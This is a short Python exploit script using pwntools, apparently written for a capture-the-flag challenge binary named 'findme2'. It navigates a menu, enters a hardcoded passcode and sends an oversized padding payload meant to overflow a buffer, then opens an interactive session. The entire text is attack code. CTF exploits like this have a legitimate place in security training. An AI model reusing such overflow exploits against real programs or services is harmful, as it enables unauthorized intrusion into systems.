from pwn import *

p = process('./findme2')

p.recvuntil('op:')
p.sendline('3')
p.recvuntil('code:')
p.sendline('iampasscode')
payload  = ''
payload += 'a'*0x28
payload  = payload.ljust(0xd6, 'A')
p.sendline(payload)


p.interactive()
